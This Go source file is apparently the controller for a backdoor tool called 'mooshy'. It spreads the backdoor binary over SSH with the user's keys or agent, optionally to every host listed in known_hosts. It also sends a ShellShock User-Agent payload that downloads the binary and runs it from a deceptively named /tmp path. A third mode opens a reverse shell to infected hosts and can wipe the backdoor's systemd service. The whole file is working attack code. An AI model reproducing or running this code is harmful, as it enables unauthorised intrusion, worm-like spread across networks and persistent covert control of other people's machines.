package main

import (
	"bytes"
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/google/go-github/github"
	"github.com/pkg/errors"
	"github.com/pkg/sftp"
	"github.com/rvolosatovs/mooshy"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
	"golang.org/x/oauth2"
)

const UnsuspiciousExecutable = "/tmp/systemd-private-bufu"

func init() {
	log.SetFlags(0)
	rand.Seed(time.Now().Unix())
}

type SSHConfig struct {
	AgentSocket string
	PrivateKey  string
	Username    string
	Addr        string
}

type SSHRunner struct {
	*ssh.Client
}

func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
	var auth []ssh.AuthMethod

	if c.AgentSocket != "" {
		a, err := net.Dial("unix", c.AgentSocket)
		if err != nil {
			return nil, errors.Wrap(err, "failed to connect to SSH agent")
		}
		auth = append(auth, ssh.PublicKeysCallback(agent.NewClient(a).Signers))
	}

	if c.PrivateKey != "" {
		b, err := ioutil.ReadFile(c.PrivateKey)
		if err != nil {
			return nil, errors.Wrap(err, "failed to read private key")
		}

		key, err := ssh.ParsePrivateKey(b)
		if err != nil {
			return nil, errors.Wrap(err, "failed to parse private key")
		}

		auth = append(auth, ssh.PublicKeys(key))
	}

	cl, err := ssh.Dial("tcp", c.Addr, &ssh.ClientConfig{
		Auth:            auth,
		User:            c.Username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		return nil, errors.Wrap(err, "failed to connect to host via SSH")
	}

	return &SSHRunner{
		Client: cl,
	}, nil
}

func (r SSHRunner) Run(cmd string) error {
	s, err := r.Client.NewSession()
	if err != nil {
		return errors.Wrap(err, "failed to create new SSH session")
	}

	if out, err := s.CombinedOutput(cmd); err != nil {
		return errors.Wrapf(err, "failed to run command, output: %s", out)
	}
	return nil
}

func (r SSHRunner) RunShellCode(b []byte) error {
	cl, err := sftp.NewClient(r.Client)
	if err != nil {
		return errors.Wrap(err, "failed to start SFTP client")
	}

	suf := make([]byte, 5)

	_, err = rand.Read(suf)
	if err != nil {
		return errors.Wrap(err, "failed to generate random bytes")
	}

	path := "/tmp/" + hex.EncodeToString(suf)

	f, err := cl.Create(path)
	if err != nil {
		return errors.Wrapf(err, "failed to create %s", path)
	}

	_, err = f.Write(b)
	if err != nil {
		return errors.Wrapf(err, "failed to write shell code to %s", path)
	}

	if err = f.Chmod(0755); err != nil {
		return errors.Wrapf(err, "failed to chmod 755 %s", path)
	}

	if err = f.Close(); err != nil {
		return errors.Wrapf(err, "failed to close %s", path)
	}

	if err = r.Run(path); err != nil {
		return errors.Wrapf(err, "failed to run shellcode at %s", path)
	}

	if err = cl.Remove(path); err != nil {
		return errors.Wrapf(err, "failed to remove shellcode from %s", path)
	}

	return errors.Wrap(cl.Close(), "failed to close SFTP connection")
}

type Runner interface {
	Run(cmd string) error
}

type ShellCodeRunner interface {
	RunShellCode(b []byte) error
}

func latestMoosh(token string) (string, error) {
	ctx := context.Background()

	var tc *http.Client
	if token != "" {
		ts := oauth2.StaticTokenSource(
			&oauth2.Token{AccessToken: token},
		)
		tc = oauth2.NewClient(ctx, ts)
	}

	rel, _, err := github.NewClient(tc).Repositories.GetLatestRelease(ctx, "rvolosatovs", "mooshy")
	if err != nil {
		return "", errors.Wrap(err, "failed to get latest release from https://github.com/rvolosatovs/mooshy")
	}

	for _, a := range rel.Assets {
		if a.GetName() == "moosh-linux-amd64" {
			return a.GetBrowserDownloadURL(), nil
		}
	}
	return "", errors.New("not found")
}

func runShell(shell io.ReadWriter, cmds ...string) (err error) {
	cmd := exec.Command("stty", "-echo", "raw")
	cmd.Stdin = os.Stdin
	if err = cmd.Run(); err != nil {
		return errors.Wrap(err, "failed to open stty")
	}

	defer func() {
		cmd := exec.Command("stty", "sane")
		cmd.Stdin = os.Stdin
		if rerr := cmd.Run(); rerr != nil && err == nil {
			err = errors.Wrap(rerr, "failed to close stty")
		}
	}()

	var in io.Reader = os.Stdin
	if len(cmds) != 0 {
		in = io.MultiReader(bytes.NewBufferString(strings.Join(cmds, "; ")+"\n"), in)
	}

	go io.Copy(os.Stdout, shell)
	_, err = io.Copy(shell, in)
	if err != nil {
		errors.Wrap(err, "failed to pass in to reverse shell")
	}
	return nil
}

func main() {
	sshUser := "averagejoe"

	var home string

	u, err := user.Current()
	if err != nil {
		log.Printf("Failed to get current user: %s", err)
		home = os.Getenv("HOME")
	} else {
		home = u.HomeDir
		sshUser = u.Username
	}

	knownHosts := filepath.Join(home, ".ssh", "known_hosts")
	sshKey := filepath.Join(home, ".ssh", "id_rsa")
	sshAgent := os.Getenv("SSH_AUTH_SOCK")

	flag.StringVar(&knownHosts, "sshKnown", knownHosts, "Path to SSH known_hosts file for SSH infection")
	flag.StringVar(&sshAgent, "sshAgent", sshAgent, "Path to SSH agent socket for SSH infection")
	flag.StringVar(&sshKey, "sshKey", sshKey, "Path to (passwordless) SSH private key for SSH infection")
	flag.StringVar(&sshUser, "sshUser", sshUser, "Username to connect as using SSH infection")
	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
	useSSHAgent := flag.Bool("useSSHAgent", false, "Use SSH agent for SSH infection")
	useSSHKey := flag.Bool("useSSHKey", false, "Use (passwordless) SSH private key for SSH infection")
	useSSHKnown := flag.Bool("useSSHKnown", false, "Infect all hosts in SSH known_hosts file using SSH infection")
	useShellShock := flag.Bool("shellShock", false, "Use Shell Shock for the infection")
	moosh := flag.String("moosh", "", "Path to moosh. If empty - uses the one from https://github.com/rvolosatovs/mooshy/releases/latest")
	addr := flag.String("addr", "", "The lucky guy(in case of Shell Shock - endpoint)")
	pre := flag.String("c", "", "Command to run before shell start")
	wipe := flag.Bool("wipe", false, "Wipe the backdoor in execution mode (The self-destructing script will be appended to '-c')")
	tcp := flag.String("tcp", ":0", "TCP address to listen on in execution mode")
	token := flag.String("token", "", "Github token to use")
	flag.Parse()

	switch {
	case *addr == "" && !*useSSHKnown,
		*useSSH && *useShellShock,
		(*useSSH || *useShellShock) && (*pre != "" || *wipe):

		if *addr == "" && !(*useSSH && *useSSHKnown) {
			log.Println("At least one of -addr or -useSSHKnown(with -ssh) must be specified")
		}

		if *useSSH && *useShellShock {
			log.Println("At most one of '-ssh' and '-shellShock' must be specified")
		}

		if (*useSSH || *useShellShock) && *pre != "" {
			log.Println("'-pre' must not be specified in infection mode")
		}

		if (*useSSH || *useShellShock) && *wipe {
			log.Println("'-wipe' must not be specified in infection mode")
		}

		flag.Usage()
		os.Exit(1)
	}

	switch {
	case *useSSH:
		var pld []byte
		if *moosh == "" {
			url, err := latestMoosh(*token)
			if err != nil {
				log.Fatalf("Failed to query latest moosh release: %s", err)
			}

			log.Printf("Downloading latest 'moosh' binary from %s...", url)
			resp, err := http.Get(url)
			if err != nil {
				log.Fatalf("Failed to GET latest moosh release from %s: %s", url, err)
			}

			pld, err = ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalf("Failed to download latest moosh release: %s", err)
			}

			if err = resp.Body.Close(); err != nil {
				log.Fatalf("Failed to close response body: %s", err)
			}
		} else {
			pld, err = ioutil.ReadFile(*moosh)
			if err != nil {
				log.Fatalf("Failed to read moosh: %s", err)
			}
		}

		var addrs []string
		if *addr != "" {
			addrs = append(addrs, *addr)
		}

		if *useSSHKnown {
			b, err := ioutil.ReadFile(knownHosts)
			if err != nil {
				log.Fatalf("Failed to read known_hosts file")
			}

		outer:
			for {
				m, hosts, _, _, rest, err := ssh.ParseKnownHosts(b)
				b = rest

				switch {
				case err == io.EOF:
					break outer
				case err != nil:
					log.Printf("Failed to parse known_hosts file entry: %s", err)
					break outer
				case m == "revoked":
					continue outer
				}

				for _, h := range hosts {
					if !strings.Contains(h, ":") {
						h += ":22"
					}
					addrs = append(addrs, h)
				}
			}
		}

		if len(addrs) == 0 {
			log.Fatal("No hosts to infect")
		}

		conf := SSHConfig{
			Username: sshUser,
		}
		if *useSSHKey {
			conf.PrivateKey = sshKey
		}
		if *useSSHAgent {
			conf.AgentSocket = sshAgent
		}

		wg := &sync.WaitGroup{}
		for _, a := range addrs {
			wg.Add(1)
			go func(conf SSHConfig, addr string) {
				defer wg.Done()

				conf.Addr = addr

				r, err := NewSSHRunner(conf)
				if err != nil {
					log.Printf("Failed to initialize SSH connection: %s", err)
					return
				}

				log.Printf("Infecting %s...", addr)
				if err = r.RunShellCode(pld); err != nil {
					log.Fatalf("Failed to pwn %s: %s", addr, err)
				}
				log.Printf("%s infected", addr)
			}(conf, a)
		}
		wg.Wait()
	case *useShellShock:
		url, err := latestMoosh(*token)
		if err != nil {
			log.Fatalf("Failed to query latest moosh release: %s", err)
		}

		req, err := http.NewRequest("GET", *addr, nil)
		if err != nil {
			log.Fatalf("Failed to create GET request for %s: %s", *addr, err)
		}

		req.Header.Set("User-Agent", fmt.Sprintf(`() { :;}; /bin/sh -c "/usr/bin/curl -L '%s' -o %s && /bin/chmod +x %s && %s && rm -f %s"& disown`,
			url, UnsuspiciousExecutable, UnsuspiciousExecutable, UnsuspiciousExecutable, UnsuspiciousExecutable))

		log.Printf("Sending ShellShock GET request to %s...", *addr)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			log.Fatalf("Failed to send ShellShock GET request to %s: %s", *addr, err)
		}
		defer resp.Body.Close()

		b, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("Failed to read response from %s: %s", *addr, err)
		}
		log.Printf("%s infected.\nResponse:\n%s", *addr, string(b))
	default:
		l, err := net.Listen("tcp4", *tcp)
		if err != nil {
			log.Fatalf("Failed to open reverse shell: %s", err)
		}
		log.Printf("TCP socket opened on %s", l.Addr())

		conn, err := net.Dial("tcp4", *addr)
		if err != nil {
			log.Fatalf("Failed to dial %s: %s", *addr, err)
		}

		_, port, err := net.SplitHostPort(l.Addr().String())
		if err != nil {
			log.Fatalf("Failed to parse port from %s: %s", l.Addr(), err)
		}

		_, err = conn.Write([]byte(mooshy.MagicNumber + port))
		if err != nil {
			log.Fatalf("Failed to send magic number to %s: %s", *addr, err)
		}

		conn, err = l.Accept()
		if err != nil {
			log.Fatalf("Failed to accept connection on %s: %s", l.Addr(), err)
		}
		log.Printf("Received connection from %s", conn.RemoteAddr())
		defer conn.Close()

		var cmds []string
		if *pre != "" {
			cmds = append(cmds, *pre)
		}
		if *wipe {
			cmds = append(cmds, []string{
				fmt.Sprintf("systemctl disable %s.service", mooshy.ServiceName),
				fmt.Sprintf("rm -f /lib/systemd/system/%s.service", mooshy.ServiceName),
				fmt.Sprintf("rm -f /lib/systemd/%s", mooshy.ServiceName),
				"systemctl daemon-reload",
				fmt.Sprintf("systemctl stop %s.service", mooshy.ServiceName),
			}...)
		}

		if err := runShell(conn, cmds...); err != nil {
			log.Fatalf("Failed to run shell on %s: %s", l.Addr(), err)
		}
	}
}
